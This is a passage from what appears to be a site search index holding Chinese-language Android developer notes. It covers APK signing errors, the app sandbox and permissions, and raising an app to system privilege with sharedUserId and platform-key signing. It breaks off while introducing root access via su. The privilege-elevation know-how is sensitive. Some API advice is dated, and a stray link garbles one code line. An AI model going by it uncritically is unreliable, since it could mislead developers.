\u4e3b\u8981\u539f\u56e0\u662f\u5e73\u65f6Eclipse\u4f7f\u7528\u7684ADT\u63d2\u4ef6\u5df2\u7ecf\u8d4b\u4e88\u4e86DEBUG\u6743\u9650\u7684\u6570\u5b57\u7b7e\u540d\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u5bfc\u51fa\u4e00\u4e2a\u672a\u7b7e\u540d\u7684APK\u6587\u4ef6\u5c31\u53ef\u4ee5\u89e3\u51b3\u3002 2.\u4f7f\u7528jarsigner\u5de5\u5177\u6765\u7b7e\u540d\uff0c\u51fa\u73b0\u65e0\u6cd5\u5bf9jar \u8fdb\u884c\u7b7e\u540d\uff1ajava.util.zip.ZipException: invalid entry compressed size (expected xxx but got xxx bytes)\u8fd9\u6837\u7684\u63d0\u793a\u3002 \u8fd9\u4e9b\u95ee\u9898\u4e3b\u8981\u662f\u7531\u4e8e\u8d44\u6e90\u6587\u4ef6\u9020\u6210\u7684\uff0c\u5bf9\u4e8eandroid\u5f00\u53d1\u6765\u8bf4\u5e94\u8be5\u68c0\u67e5res\u6587\u4ef6\u5939\u4e2d\u7684\u6587\u4ef6\uff0c\u9010\u4e2a\u6392\u67e5\u3002\u8fd9\u4e2a\u95ee\u9898\u53ef\u4ee5\u901a\u8fc7\u5347\u7ea7\u7cfb\u7edf\u7684JDK\u548cJRE\u7248\u672c\u6765\u89e3\u51b3\u3002 3.\u5b89\u88c5apk\u8fc7\u7a0b\u4e2d\u51fa\u73b0\uff1aINSTALL_PARSE_FAILED_INCONSISTENT_CERTIFICATES\u3002 \u8fd9\u6837\u7684\u95ee\u9898\u4e3b\u8981\u662f\u7b7e\u540d\u51b2\u7a81\u9020\u6210\u7684\uff0c\u6bd4\u5982\u4f60\u4f7f\u7528\u4e86ADB\u7684debug\u6743\u9650\u7b7e\u540d\uff0c\u4f46\u540e\u6765\u4f7f\u7528\u6807\u51c6sign\u7b7e\u540d\u540e\u518d\u5b89\u88c5\u540c\u4e00\u4e2a\u6587\u4ef6\u4f1a\u51fa\u73b0\u8fd9\u6837\u7684\u9519\u8bef\u63d0\u793a\uff0c\u89e3\u51b3\u7684\u65b9\u6cd5\u53ea\u6709\u5148\u8001\u8001\u5b9e\u5b9e\u4ece\u624b\u673a\u4e0a\u5378\u8f7d\u539f\u6709\u7248\u672c\u518d\u8fdb\u884c\u5b89\u88c5\uff0c\u800cadb install -r\u53c2\u6570\u4e5f\u65e0\u6cd5\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u3002adb uninstall \u5378\u8f7d\u539f\u6765\u7684\u5e94\u7528\u3002 \u539f\u6587\u94fe\u63a5\uff1a https://www.cnblogs.com/wanqieddy/p/3556060.html","title":"\u516d\u3001\u5e38\u89c1\u5f02\u5e38\uff1a"},{"location":"Android/Android%E7%B3%BB%E7%BB%9F%E6%9D%83%E9%99%90%E5%92%8Croot%E6%9D%83%E9%99%90/","text":"Android\u7cfb\u7edf\u6743\u9650\u548croot\u6743\u9650 Android\u6743\u9650\u8bf4\u660e Android\u7cfb\u7edf\u662f\u8fd0\u884c\u5728Linux\u5185\u6838\u4e0a\u7684\uff0cAndroid\u4e0eLinux\u5206\u522b\u6709\u81ea\u5df1\u7684\u4e00\u5957\u4e25\u683c\u7684\u5b89\u5168\u53ca\u6743\u9650\u673a\u5236\uff0c Android\u7cfb\u7edf\u6743\u9650\u76f8\u5173\u7684\u5185\u5bb9\uff0c \uff08\u4e00\uff09linux\u6587\u4ef6\u7cfb\u7edf\u4e0a\u7684\u6743\u9650 -rwxr-x--x system system 4156 2012-06-30 16:12 test.apk. \u4ee3\u8868\u7684\u662f\u76f8\u5e94\u7684\u7528\u6237/\u7528\u6237\u7ec4\u53ca\u5176\u4ed6\u4eba\u5bf9\u6b64\u6587\u4ef6\u7684\u8bbf\u95ee\u6743\u9650\uff0c\u4e0e\u6b64\u6587\u4ef6\u8fd0\u884c\u8d77\u6765\u5177\u6709\u7684\u6743\u9650\u5b8c\u5168\u4e0d\u76f8\u5173\u6bd4\u5982\u4e0a\u9762\u7684\u4f8b\u5b50\u53ea\u80fd\u8bf4\u660esystem\u7528\u6237\u62e5\u6709\u5bf9\u6b64\u6587\u4ef6\u7684\u8bfb\u5199\u6267\u884c\u6743\u9650\uff1bsystem\u7ec4\u7684\u7528\u6237\u5bf9\u6b64\u6587\u4ef6\u62e5\u6709\u8bfb\u3001\u6267\u884c\u6743\u9650\uff1b\u5176\u4ed6\u4eba\u5bf9\u6b64\u6587\u4ef6\u53ea\u5177\u6709\u6267\u884c\u6743\u9650\u3002\u800ctest.apk\u8fd0\u884c\u8d77\u6765\u540e\u53ef\u4ee5\u5e72\u54ea\u4e9b\u4e8b\u60c5\uff0c\u8ddf\u8fd9\u4e2a\u5c31\u4e0d\u76f8\u5173\u4e86\u3002 \u5343\u4e07\u4e0d\u8981\u770bapk\u6587\u4ef6\u7cfb\u7edf\u4e0a\u5c5e\u4e8esystem/system\u7528\u6237\u53ca\u7528\u6237\u7ec4\uff0c\u6216\u8005root/root\u7528\u6237\u53ca\u7528\u6237\u7ec4\uff0c\u5c31\u8ba4\u4e3aapk\u5177\u6709system\u6216root\u6743\u9650\u3002apk\u7a0b\u5e8f\u662f\u8fd0\u884c\u5728\u865a\u62df\u673a\u4e0a\u7684,\u5bf9\u5e94\u7684\u662fAndroid\u72ec\u7279\u7684\u6743\u9650\u673a\u5236\uff0c\u53ea\u6709\u4f53\u73b0\u5230\u6587\u4ef6\u7cfb\u7edf\u4e0a\u65f6\u624d\u4f7f\u7528linux\u7684\u6743\u9650\u8bbe\u7f6e\u3002 \uff08\u4e8c\uff09Android\u7684\u6743\u9650\u89c4\u5219 \uff081)Android\u4e2d\u7684apk\u5fc5\u987b\u7b7e\u540d \u8fd9\u79cd\u7b7e\u540d\u4e0d\u662f\u57fa\u4e8e\u6743\u5a01\u8bc1\u4e66\u7684\uff0c\u4e0d\u4f1a\u51b3\u5b9a\u67d0\u4e2a\u5e94\u7528\u5141\u4e0d\u5141\u8bb8\u5b89\u88c5\uff0c\u800c\u662f\u4e00\u79cd\u81ea\u7b7e\u540d\u8bc1\u4e66\u3002 \u91cd\u8981\u7684\u662f\uff0candroid\u7cfb\u7edf\u6709\u7684\u6743\u9650\u662f\u57fa\u4e8e\u7b7e\u540d\u7684\u3002\u6bd4\u5982\uff1asystem\u7b49\u7ea7\u7684\u6743\u9650\u6709\u4e13\u95e8\u5bf9\u5e94\u7684\u7b7e\u540d\uff0c\u7b7e\u540d\u4e0d\u5bf9\uff0c\u6743\u9650\u4e5f\u5c31\u83b7\u53d6\u4e0d\u5230\u3002 \u9ed8\u8ba4\u751f\u6210\u7684APK\u6587\u4ef6\u662fdebug\u7b7e\u540d\u7684\u3002\u83b7\u53d6system\u6743\u9650\u65f6\u7528\u5230\u7684\u7b7e\u540d\u89c1\u540e\u9762\u63cf\u8ff0 \uff082\uff09\u57fa\u4e8eUserID\u7684\u8fdb\u7a0b\u7ea7\u522b\u7684\u5b89\u5168\u673a\u5236 \u8fdb\u7a0b\u6709\u72ec\u7acb\u7684\u5730\u5740\u7a7a\u95f4\uff0c\u8fdb\u7a0b\u4e0e\u8fdb\u7a0b\u95f4\u9ed8\u8ba4\u662f\u4e0d\u80fd\u4e92\u76f8\u8bbf\u95ee\u7684\uff0cAndroid\u901a\u8fc7\u4e3a\u6bcf\u4e00\u4e2aapk\u5206\u914d\u552f\u4e00\u7684linux userID\u6765\u5b9e\u73b0\uff0c\u540d\u79f0\u4e3a\"app_\"\u52a0\u4e00\u4e2a\u6570\u5b57\uff0c\u6bd4\u5982app_43\u4e0d\u540c\u7684UserID\uff0c\u8fd0\u884c\u5728\u4e0d\u540c\u7684\u8fdb\u7a0b\uff0c\u6240\u4ee5apk\u4e4b\u95f4\u9ed8\u8ba4\u4fbf\u4e0d\u80fd\u76f8\u4e92\u8bbf\u95ee\u3002 Android\u63d0\u4f9b\u4e86\u5982\u4e0b\u7684\u4e00\u79cd\u673a\u5236\uff0c\u53ef\u4ee5\u4f7f\u4e24\u4e2aapk\u6253\u7834\u524d\u9762\u8bb2\u7684\u8fd9\u79cd\u58c1\u5792\u3002 \u5728AndroidManifest.xml\u4e2d\u5229\u7528sharedUserId\u5c5e\u6027\u7ed9\u4e0d\u540c\u7684package\u5206\u914d\u76f8\u540c\u7684userID\uff0c\u901a\u8fc7\u8fd9\u6837\u505a\uff0c\u4e24\u4e2apackage\u53ef\u4ee5\u88ab\u5f53\u505a\u540c\u4e00\u4e2a\u7a0b\u5e8f\uff0c \u7cfb\u7edf\u4f1a\u5206\u914d\u7ed9\u4e24\u4e2a\u7a0b\u5e8f\u76f8\u540c\u7684UserID\u3002\u5f53\u7136\uff0c\u57fa\u4e8e\u5b89\u5168\u8003\u8651\uff0c\u4e24\u4e2aapk\u9700\u8981\u76f8\u540c\u7684\u7b7e\u540d\uff0c\u5426\u5219\u6ca1\u6709\u9a8c\u8bc1\u4e5f\u5c31\u6ca1\u6709\u610f\u4e49\u4e86\u3002 \uff083\uff09\u9ed8\u8ba4apk\u751f\u6210\u7684\u6570\u636e\u5bf9\u5916\u662f\u4e0d\u53ef\u89c1\u7684 \u5b9e\u73b0\u65b9\u6cd5\u662f\uff1aAndroid\u4f1a\u4e3a\u7a0b\u5e8f\u5b58\u50a8\u7684\u6570\u636e\u5206\u914d\u8be5\u7a0b\u5e8f\u7684UserID\u3002 \u501f\u52a9\u4e8eLinux\u4e25\u683c\u7684\u6587\u4ef6\u7cfb\u7edf\u8bbf\u95ee\u6743\u9650\uff0c\u4fbf\u5b9e\u73b0\u4e86apk\u4e4b\u95f4\u4e0d\u80fd\u76f8\u4e92\u8bbf\u95ee\u4f3c\u6709\u6570\u636e\u7684\u673a\u5236\u3002 \u4f8b\uff1a\u6211\u7684\u5e94\u7528\u521b\u5efa\u7684\u4e00\u4e2a\u6587\u4ef6\uff0c\u9ed8\u8ba4\u6743\u9650\u5982\u4e0b\uff0c\u53ef\u4ee5\u770b\u5230\u53ea\u6709UserID\u4e3aapp_21\u7684\u7a0b\u5e8f\u624d\u80fd\u8bfb\u5199\u8be5\u6587\u4ef6\u3002 -rw------- app_21 app_21 87650 2000-01-01 09:48 test.txt \u5982\u4f55\u5bf9\u5916\u5f00\u653e\uff1f <1> \u4f7f\u7528MODE_WORLD_READABLE and/or MODE_WORLD_WRITEABLE\u6807\u8bb0\u3002 When creating a new file with getSharedPreferences(String, int), openFileOutput(String, int), or openOrCreateDatabase(String, int, SQLiteDatabase.CursorFactory), you can use the MODE_WORLD_READABLE and/or MODE_WORLD_WRITEABLE flags to allow any other package to read/write the file. When setting these flags, the file is still owned by your application, but its global read and/or write permissions have been set appropriately so any other application can see it. \uff084\uff09AndroidManifest.xml\u4e2d\u7684\u663e\u5f0f\u6743\u9650\u58f0\u660e Android\u9ed8\u8ba4\u5e94\u7528\u662f\u6ca1\u6709\u4efb\u4f55\u6743\u9650\u53bb\u64cd\u4f5c\u5176\u4ed6\u5e94\u7528\u6216\u7cfb\u7edf\u76f8\u5173\u7279\u6027\u7684\uff0c\u5e94\u7528\u5728\u8fdb\u884c\u67d0\u4e9b\u64cd\u4f5c\u65f6\u90fd\u9700\u8981\u663e\u5f0f\u5730\u53bb\u7533\u8bf7\u76f8\u5e94\u7684\u6743\u9650\u3002 \u4e00\u822c\u4ee5\u4e0b\u52a8\u4f5c\u65f6\u90fd\u9700\u8981\u7533\u8bf7\u76f8\u5e94\u7684\u6743\u9650\uff1a A particular permission may be enforced at a number of places during your program's operation: At the time of a call into the system, to prevent an application from executing certain functions.When starting an activity, to prevent applications from launching activities of other applications.Both sending and receiving broadcasts, to control who can receive your broadcast or who can send a broadcast to you.When accessing and operating on a content provider.Binding or starting a service. \u5728\u5e94\u7528\u5b89\u88c5\u7684\u65f6\u5019\uff0cpackage installer\u4f1a\u68c0\u6d4b\u8be5\u5e94\u7528\u8bf7\u6c42\u7684\u6743\u9650\uff0c\u6839\u636e\u8be5\u5e94\u7528\u7684\u7b7e\u540d\u6216\u8005\u63d0\u793a\u7528\u6237\u6765\u5206\u914d\u76f8\u5e94\u7684\u6743\u9650\u3002 \u5728\u7a0b\u5e8f\u8fd0\u884c\u671f\u95f4\u662f\u4e0d\u68c0\u6d4b\u6743\u9650\u7684\u3002\u5982\u679c\u5b89\u88c5\u65f6\u6743\u9650\u83b7\u53d6\u5931\u8d25\uff0c\u90a3\u6267\u884c\u5c31\u4f1a\u51fa\u9519\uff0c\u4e0d\u4f1a\u63d0\u793a\u7528\u6237\u6743\u9650\u4e0d\u591f\u3002 \u5927\u591a\u6570\u60c5\u51b5\u4e0b\uff0c\u6743\u9650\u4e0d\u8db3\u5bfc\u81f4\u7684\u5931\u8d25\u4f1a\u5f15\u53d1\u4e00\u4e2a SecurityException\uff0c\u4f1a\u5728\u7cfb\u7edflog\uff08system log\uff09\u4e2d\u6709\u76f8\u5173\u8bb0\u5f55\u3002 \uff085\uff09\u6743\u9650\u7ee7\u627f/UserID\u7ee7\u627f \u5f53\u6211\u4eec\u9047\u5230apk\u6743\u9650\u4e0d\u8db3\u65f6\uff0c\u6211\u4eec\u6709\u65f6\u4f1a\u8003\u8651\u5199\u4e00\u4e2alinux\u7a0b\u5e8f\uff0c\u7136\u540e\u7531apk\u8c03\u7528\u5b83\u53bb\u5b8c\u6210\u67d0\u4e2a\u5b83\u6ca1\u6709\u6743\u9650\u5b8c\u6210\u7684\u4e8b\u60c5\uff0c\u5f88\u9057\u61be\uff0c\u8fd9\u79cd\u65b9\u6cd5\u662f\u884c\u4e0d\u901a\u7684\u3002 \u524d\u9762\u8bb2\u8fc7\uff0candroid\u6743\u9650\u662f\u5728\u8fdb\u7a0b\u5c42\u9762\u7684\uff0c\u4e5f\u5c31\u662f\u8bf4\u4e00\u4e2aapk\u5e94\u7528\u542f\u52a8\u7684\u5b50\u8fdb\u7a0b\u7684\u6743\u9650\u4e0d\u53ef\u80fd\u8d85\u8d8a\u5176\u7236\u8fdb\u7a0b\u7684\u6743\u9650\uff08\u5373apk\u7684\u6743\u9650\uff09\uff0c \u5373\u4f7f\u5355\u72ec\u8fd0\u884c\u67d0\u4e2a\u5e94\u7528\u6709\u6743\u9650\u505a\u67d0\u4e8b\uff0c\u4f46\u5982\u679c\u5b83\u662f\u7531\u4e00\u4e2aapk\u8c03\u7528\u7684\uff0c\u90a3\u6743\u9650\u5c31\u4f1a\u88ab\u9650\u5236\u3002 \u5b9e\u9645\u4e0a\uff0candroid\u662f\u901a\u8fc7\u7ed9\u5b50\u8fdb\u7a0b\u5206\u914d\u7236\u8fdb\u7a0b\u7684UserID\u5b9e\u73b0\u8fd9\u4e00\u673a\u5236\u7684\u3002 \uff08\u4e09\uff09\u5e38\u89c1\u6743\u9650\u4e0d\u8db3\u95ee\u9898\u5206\u6790 \u9996\u5148\u8981\u77e5\u9053\uff0c\u666e\u901aapk\u7a0b\u5e8f\u662f\u8fd0\u884c\u5728\u975eroot\u3001\u975esystem\u5c42\u7ea7\u7684\uff0c\u4e5f\u5c31\u662f\u8bf4\u770b\u8981\u8bbf\u95ee\u7684\u6587\u4ef6\u7684\u6743\u9650\u65f6\uff0c\u770b\u7684\u662f\u6700\u540e\u4e09\u4f4d\u3002 \u53e6\u5916\uff0c\u901a\u8fc7system/app\u5b89\u88c5\u7684apk\u7684\u6743\u9650\u4e00\u822c\u6bd4\u76f4\u63a5\u5b89\u88c5\u6216adb install\u5b89\u88c5\u7684apk\u7684\u6743\u9650\u8981\u9ad8\u4e00\u4e9b\u3002 \u8a00\u5f52\u6b63\u4f20\uff0c\u8fd0\u884c\u4e00\u4e2aandroid\u5e94\u7528\u7a0b\u5e8f\u8fc7\u7a0b\u4e2d\u9047\u5230\u6743\u9650\u4e0d\u8db3\uff0c\u4e00\u822c\u5206\u4e3a\u4e24\u79cd\u60c5\u51b5: \uff081\uff09Log\u4e2d\u53ef\u660e\u663e\u770b\u5230\u6743\u9650\u4e0d\u8db3\u7684\u63d0\u793a\u3002 \u6b64\u79cd\u60c5\u51b5\u4e00\u822c\u662fAndroidManifest.xml\u4e2d\u7f3a\u5c11\u76f8\u5e94\u7684\u6743\u9650\u8bbe\u7f6e\uff0c\u597d\u597d\u67e5\u627e\u4e00\u756a\u6743\u9650\u5217\u8868\uff0c\u5e94\u8be5\u5c31\u53ef\u89e3\u51b3\uff0c\u662f\u6700\u6613\u5904\u7406\u7684\u60c5\u51b5\u3002 \u6709\u65f6\u6743\u9650\u90fd\u52a0\u4e0a\u4e86\uff0c\u4f46\u8fd8\u662f\u62a5\u6743\u9650\u4e0d\u8db3\uff0c\u662f\u4ec0\u4e48\u60c5\u51b5\u5462\uff1f Android\u7cfb\u7edf\u6709\u4e00\u4e9bAPI\u53ca\u6743\u9650\u662f\u9700\u8981apk\u5177\u6709\u4e00\u5b9a\u7684\u7b49\u7ea7\u624d\u80fd\u8fd0\u884c\u7684\u3002 \u6bd4\u5982 SystemClock.setCurrentTimeMillis()\u4fee\u6539\u7cfb\u7edf\u65f6\u95f4\uff0cWRITE_SECURE_SETTINGS\u6743\u9650\u597d\u50cf\u90fd\u662f\u9700\u8981\u6709system\u7ea7\u7684\u6743\u9650\u624d\u884c\u3002 \u4e5f\u5c31\u662f\u8bf4UserID\u662fsystem. \uff082\uff09Log\u91cc\u6ca1\u6709\u62a5\u6743\u9650\u4e0d\u8db3\uff0c\u800c\u662f\u4e00\u4e9b\u5176\u4ed6Exception\u7684\u63d0\u793a,\u8fd9\u4e5f\u6709\u53ef\u80fd\u662f\u6743\u9650\u4e0d\u8db3\u9020\u6210\u7684\u3002 \u6bd4\u5982\uff1a\u6211\u4eec\u5e38\u4f1a\u60f3\u8bfb/\u5199\u4e00\u4e2a\u914d\u7f6e\u6587\u4ef6\u6216\u5176\u4ed6\u4e00\u4e9b\u4e0d\u662f\u81ea\u5df1\u521b\u5efa\u7684\u6587\u4ef6\uff0c\u5e38\u4f1a\u62a5java.io.FileNotFoundException\u9519\u8bef\u3002 \u7cfb\u7edf\u8ba4\u4e3a\u6bd4\u8f83\u91cd\u8981\u7684\u6587\u4ef6\u4e00\u822c\u6743\u9650\u8bbe\u7f6e\u7684\u4e5f\u4f1a\u6bd4\u8f83\u4e25\u683c\uff0c\u7279\u522b\u662f\u4e00\u4e9b\u5f88\u91cd\u8981\u7684(\u914d\u7f6e)\u6587\u4ef6\u6216\u76ee\u5f55\u3002 \u5982 -r--r----- bluetooth bluetooth 935 2010-07-09 20:21 dbus.conf drwxrwx--x system system 2010-07-07 02:05 data dbus.conf\u597d\u50cf\u662f\u84dd\u7259\u7684\u914d\u7f6e\u6587\u4ef6\uff0c\u4ece\u6743\u9650\u4e0a\u6765\u770b\uff0c\u6839\u672c\u5c31\u4e0d\u53ef\u80fd\u6539\u52a8\uff0c\u975ebluetooth\u7528\u6237\u8fde\u8bfb\u7684\u6743\u5229\u90fd\u6ca1\u6709\u3002 /data\u76ee\u5f55\u4e0b\u5b58\u7684\u662f\u6240\u6709\u7a0b\u5e8f\u7684\u79c1\u6709\u6570\u636e\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0bandroid\u662f\u4e0d\u5141\u8bb8\u666e\u901aapk\u8bbf\u95ee/data\u76ee\u5f55\u4e0b\u5185\u5bb9\u7684\uff0c\u901a\u8fc7data\u76ee\u5f55\u7684\u6743\u9650\u8bbe\u7f6e\u53ef\u77e5\uff0c\u5176\u4ed6\u7528\u6237\u6ca1\u6709\u8bfb\u7684\u6743\u9650\u3002 \u6240\u4ee5adb\u666e\u901a\u6743\u9650\u4e0b\u5728data\u76ee\u5f55\u4e0b\u6572ls\u547d\u4ee4\uff0c\u4f1a\u5f97\u5230 opendir failed, Permission denied \u7684\u9519\u8bef\uff0c\u901a\u8fc7\u4ee3\u7801file.listfiles()\u4e5f\u65e0\u6cd5\u83b7\u5f97data\u76ee\u5f55\u4e0b\u7684\u5185\u5bb9\u3002 \u4e0a\u9762\u4e24\u79cd\u60c5\u51b5\uff0c\u4e00\u822c\u90fd\u9700\u8981\u63d0\u5347apk\u7684\u6743\u9650\uff0c\u76ee\u524d\u6211\u6240\u77e5\u7684apk\u80fd\u63d0\u5347\u5230\u7684\u6743\u9650\u5c31\u662fsystem\uff08\u5177\u4f53\u65b9\u6cd5\u89c1\uff1a\u5982\u4f55\u4f7fAndroid\u5e94\u7528\u7a0b\u5e8f\u83b7\u53d6\u7cfb\u7edf\u6743\u9650\uff09, \u600e\u6837\u4f7fandroid apk \u83b7\u53d6system\u6743\u9650 \u6700\u8fd1\u5728\u56de\u7b54\u5ba2\u6237\u7684\u95ee\u9898\u65f6\uff0c\u63d0\u5230\u600e\u4e48\u5c06apk \u5347\u7ea7\u5230root\u6743\u9650\u3002 1.\u4e00\u822c\u6743\u9650\u7684\u6dfb\u52a0 \u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u8bbe\u5b9aapk\u7684\u6743\u9650\uff0c\u53ef\u5728AndroidManifest.xml\u4e2d\u6dfb\u52a0android:sharedUserId=\"android.uid.xxx> \u4f8b\u5982\uff1a \u7ed9apk\u6dfb\u52a0system\u6743\u9650 <manifest xmlns:android=\"http://schemas.android.com/apk/res/android\" ... ... android:sharedUserId=\"android.uid.system\"> \u540c\u65f6\u8fd8\u9700\u8981\u5728\u5bf9\u5e94\u7684Android.mk\u4e2d\u6dfb\u52a0LOCAL_CERTIFICATE := platform\u8fd9\u4e00\u9879\u3002\u5373\u7528\u7cfb\u7edf\u7684\u7b7e\u540d\uff0c\u901a\u8fc7\u8fd9\u79cd\u65b9\u5f0f\u53ea\u80fd\u4f7fapk\u7684\u6743\u9650\u5347\u7ea7\u5230system\u7ea7\u522b\uff0c\u7cfb\u7edf\u4e2d\u8981\u6c42root\u6743\u9650\u624d\u80fd\u8bbf\u95ee\u7684\u6587\u4ef6\uff0capk\u8fd8\u662f\u4e0d\u80fd\u8bbf\u95ee\u3002 \u6bd4\u5982\u5728android \u7684API\u4e2d\u6709\u63d0\u4f9b SystemClock.setCurrentTimeMillis()\u51fd\u6570\u6765\u4fee\u6539\u7cfb\u7edf\u65f6\u95f4\uff0c\u8fd9\u4e2a\u51fd\u6570\u9700\u8981root\u6743\u9650\u6216\u8005\u8fd0\u884c\u4e0e\u7cfb\u7edf\u8fdb\u7a0b\u4e2d\u624d\u53ef\u4ee5\u7528\u3002 \u7b2c\u4e00\u4e2a\u65b9\u6cd5\u7b80\u5355\u70b9\uff0c\u4e0d\u8fc7\u9700\u8981\u5728Android\u7cfb\u7edf\u6e90\u7801\u7684\u73af\u5883\u4e0b\u7528make\u6765\u7f16\u8bd1\uff1a 1. \u5728\u5e94\u7528\u7a0b\u5e8f\u7684AndroidManifest.xml\u4e2d\u7684manifest\u8282\u70b9\u4e2d\u52a0\u5165android:sharedUserId=\"android.uid.system\"\u8fd9\u4e2a\u5c5e\u6027\u3002 2. \u4fee\u6539Android.mk\u6587\u4ef6\uff0c\u52a0\u5165LOCAL_CERTIFICATE := platform\u8fd9\u4e00\u884c 3. \u4f7f\u7528mm\u547d\u4ee4\u6765\u7f16\u8bd1\uff0c\u751f\u6210\u7684apk\u5c31\u6709\u4fee\u6539\u7cfb\u7edf\u65f6\u95f4\u7684\u6743\u9650\u4e86\u3002 \u7b2c\u4e8c\u4e2a\u65b9\u6cd5\u662f\u76f4\u63a5\u628aeclipse\u7f16\u51fa\u6765\u7684apk\u7528\u7cfb\u7edf\u7684\u7b7e\u540d\u6587\u4ef6\u7b7e\u540d 1. \u52a0\u5165android:sharedUserId=\"android.uid.system\"\u8fd9\u4e2a\u5c5e\u6027\u3002 2. \u4f7f\u7528eclipse\u7f16\u8bd1\u51faapk\u6587\u4ef6\u3002 3. \u4f7f\u7528\u76ee\u6807\u7cfb\u7edf\u7684platform\u5bc6\u94a5\u6765\u91cd\u65b0\u7ed9apk\u6587\u4ef6\u7b7e\u540d\u3002\u9996\u5148\u627e\u5230\u5bc6\u94a5\u6587\u4ef6\uff0c\u5728\u6211ndroid\u6e90\u7801\u76ee\u5f55\u4e2d\u7684\u4f4d\u7f6e\u662f\"build/target/product/security\"\uff0c\u4e0b\u9762\u7684platform.pk8\u548cplatform.x509.pem\u4e24\u4e2a\u6587\u4ef6\u3002\u7136\u540e\u7528Android\u63d0\u4f9b\u7684Signapk\u5de5\u5177\u6765\u7b7e\u540d\uff0csignapk\u7684\u6e90\u4ee3\u7801\u662f\u5728\"build/tools/signapk\"\u4e0b\uff0c\u7f16\u8bd1\u540e\u5728out/host/linux-x86/framework\u4e0b\uff0c\u7528\u6cd5\u4e3ajava -jar signapk.jar platform.x509.pem platform.pk8 input.apk output.apk\"\u3002 \u52a0\u5165android:sharedUserId=\"android.uid.system\"\u8fd9\u4e2a\u5c5e\u6027\u3002\u901a\u8fc7Shared User id,\u62e5\u6709\u540c\u4e00\u4e2aUser id\u7684\u591a\u4e2aAPK\u53ef\u4ee5\u914d\u7f6e\u6210\u8fd0\u884c\u5728\u540c\u4e00\u4e2a\u8fdb\u7a0b\u4e2d\u3002\u90a3\u4e48\u628a\u7a0b\u5e8f\u7684UID\u914d\u6210android.uid.system\uff0c\u4e5f\u5c31\u662f\u8981\u8ba9\u7a0b\u5e8f\u8fd0\u884c\u5728\u7cfb\u7edf\u8fdb\u7a0b\u4e2d\uff0c\u8fd9\u6837\u5c31\u6709\u6743\u9650\u6765\u4fee\u6539\u7cfb\u7edf\u65f6\u95f4\u4e86\u3002 \u53ea\u662f\u52a0\u5165UID\u8fd8\u4e0d\u591f\uff0c\u5982\u679c\u8fd9\u65f6\u5019\u5b89\u88c5APK\u7684\u8bdd\u53d1\u73b0\u65e0\u6cd5\u5b89\u88c5\uff0c\u63d0\u793a\u7b7e\u540d\u4e0d\u7b26\uff0c\u539f\u56e0\u662f\u7a0b\u5e8f\u60f3\u8981\u8fd0\u884c\u5728\u7cfb\u7edf\u8fdb\u7a0b\u4e2d\u8fd8\u8981\u6709\u76ee\u6807\u7cfb\u7edf\u7684platform key\uff0c\u5c31\u662f\u4e0a\u9762\u7b2c\u4e8c\u4e2a\u65b9\u6cd5\u63d0\u5230\u7684platform.pk8\u548cplatform.x509.pem\u4e24\u4e2a\u6587\u4ef6\u3002\u7528\u8fd9\u4e24\u4e2akey\u7b7e\u540d\u540eapk\u624d\u771f\u6b63\u53ef\u4ee5\u653e\u5165\u7cfb\u7edf\u8fdb\u7a0b\u4e2d\u3002\u7b2c\u4e00\u4e2a\u65b9\u6cd5\u4e2d\u52a0\u5165LOCAL_CERTIFICATE := platform\u5176\u5b9e\u5c31\u662f\u7528\u8fd9\u4e24\u4e2akey\u6765\u7b7e\u540d\u3002 \u8fd9\u4e5f\u6709\u4e00\u4e2a\u95ee\u9898\uff0c\u5c31\u662f\u8fd9\u6837\u751f\u6210\u7684\u7a0b\u5e8f\u53ea\u6709\u5728\u539f\u59cb\u7684Android\u7cfb\u7edf\u6216\u8005\u662f\u81ea\u5df1\u7f16\u8bd1\u7684\u7cfb\u7edf\u4e2d\u624d\u53ef\u4ee5\u7528\uff0c\u56e0\u4e3a\u8fd9\u6837\u7684\u7cfb\u7edf\u624d\u53ef\u4ee5\u62ff\u5230platform.pk8\u548cplatform.x509.pem\u4e24\u4e2a\u6587\u4ef6\u3002\u8981\u662f\u522b\u5bb6\u516c\u53f8\u505a\u7684Android\u4e0a\u8fde\u5b89\u88c5\u90fd\u5b89\u88c5\u4e0d\u4e86\u3002\u8bd5\u8bd5\u539f\u59cb\u7684Android\u4e2d\u7684key\u6765\u7b7e\u540d\uff0c\u7a0b\u5e8f\u5728\u6a21\u62df\u5668\u4e0a\u8fd0\u884cOK\uff0c\u4e0d\u8fc7\u653e\u5230G3\u4e0a\u5b89\u88c5\u76f4\u63a5\u63d0\u793a\"Package ... has no signatures that match those in shared user android.uid.system\"\uff0c\u8fd9\u6837\u4e5f\u662f\u4fdd\u62a4\u4e86\u7cfb\u7edf\u7684\u5b89\u5168\u3002 \u600e\u6837\u4f7fandroid apk \u83b7\u53d6root\u6743\u9650 \u4e00\u822clinux \u83b7\u53d6root\u6743\u9650\u662f\u901a\u8fc7\u6267\u884csu\u547d\u4ee4\uff0c\u90a3\u80fd\u4e0d\u80fd\u5728apk\u7a0b\u5e8f\u4e2d\u4e5f\u540c\u6837\u6267\u884c\u4e00\u4e0b\u8be5\u547d\u4ee4\u5462\uff0c\u6211\u4eec\u77e5\u9053\u5728linux\u7f16\u7a0b\u4e2d\uff0c\u6709exec\u51fd\u6570\u65cf\uff1a \u3000\u3000int execl(c[ON](http://www.dzsc.com/data/iccompany/detail12.html)st char *path, const char *arg, ...); \u3000\u3000int execlp(const char *file, const char *arg, ...); \u3000\u3000int execle(const char *path, const char *arg, ..., char *const envp[]); \u3000\u3000int execv(const char *path, char *const argv[]); \u3000\u3000int execvp(const char *file, char *const argv[]); \u3000\u3000int execve(const char *path, char *const argv[], char *const envp[]); \u5728java\u4e2d\u6211\u4eec\u53ef\u4ee5\u501f\u52a9\ufeff\ufeff\ufeff\ufeff\ufeff\ufeff\ufeff\ufeff Runtime.getRuntime().exec([String](http://www.coderanch.com/t/410859/java/java/String-StringBuffer-StringBuilder-Performance \"String vs. StringBuilder/StringBuffer\") command) 